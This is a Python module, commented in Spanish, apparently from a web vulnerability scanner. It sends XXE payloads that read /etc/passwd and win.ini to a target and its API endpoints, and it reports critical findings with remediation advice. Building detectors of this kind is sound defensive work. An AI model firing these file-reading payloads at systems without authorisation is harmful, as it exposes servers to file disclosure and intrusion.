"""
modules/xxe.py — Escáner de Inyección de Entidades Externas XML (XXE).

Envía payloads XML maliciosos tratando de leer archivos locales del servidor
(/etc/passwd o win.ini) para verificar si el parser XML es vulnerable.
"""

from __future__ import annotations

import asyncio

from utils.http import AsyncHTTPClient
from utils.vuln import Vuln, make_vuln


# Payloads para Linux y Windows
XXE_PAYLOADS = [
    (
        "Linux (/etc/passwd)",
        """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data><user>&xxe;</user></data>""",
        "root:x:0:0"
    ),
    (
        "Windows (win.ini)",
        """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>
<data><user>&xxe;</user></data>""",
        "[extensions]"
    )
]

async def run(
    client: AsyncHTTPClient,
    url:    str,
    api_endpoints: list[dict] = None
) -> list[Vuln]:
    """
    Prueba XXE inyectando el payload en la raíz y en los endpoints API detectados.
    """
    vulns: list[Vuln] = []
    sem = asyncio.Semaphore(3)

    targets = [url]
    if api_endpoints:
        targets.extend(e["url"] for e in api_endpoints if e["type"] == "api")

    # Eliminar duplicados
    targets = list(set(targets))

    async def check(target: str, os_name: str, payload: str, indicator: str):
        async with sem:
            resp = await client.session.post(
                target,
                data=payload,
                headers=client._build_headers({
                    "Content-Type": "application/xml",
                    "Accept": "application/xml, text/xml, */*"
                }),
                allow_redirects=True,
                ssl=False
            )
            try:
                body = (await resp.text()).lower()
                if indicator.lower() in body:
                    vulns.append(make_vuln(
                        title       = f"XML External Entity (XXE) - {os_name}",
                        severity    = "CRITICAL",
                        cvss        = 9.8,
                        category    = "XXE",
                        description = (
                            f"El endpoint '{target}' procesa XML y es vulnerable a XXE. "
                            "Un atacante puede leer archivos locales del servidor y realizar SSRF."
                        ),
                        evidence    = f"Payload XML inyectado. Archivo extraído parcialmente (Indicador: {indicator}).",
                        fix         = (
                            "Deshabilitar la resolución de Entidades Externas (XXE) y DTDs "
                            "en la configuración del parser XML (ej. en libxml2, documentbuilder)."
                        ),
                        ref         = "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
                        module      = "xxe",
                        url         = target,
                    ))
            except Exception:
                pass

    tasks = []
    for target in targets[:5]:  # Limitar a 5 endpoints para no saturar
        for os_name, payload, indicator in XXE_PAYLOADS:
            tasks.append(check(target, os_name, payload, indicator))

    if tasks:
        await asyncio.gather(*tasks)

    # Eliminar posibles vulnerabilidades repetidas por la misma causa
    unique_vulns = []
    seen = set()
    for v in vulns:
        if v.url not in seen:
            seen.add(v.url)
            unique_vulns.append(v)

    return unique_vulns
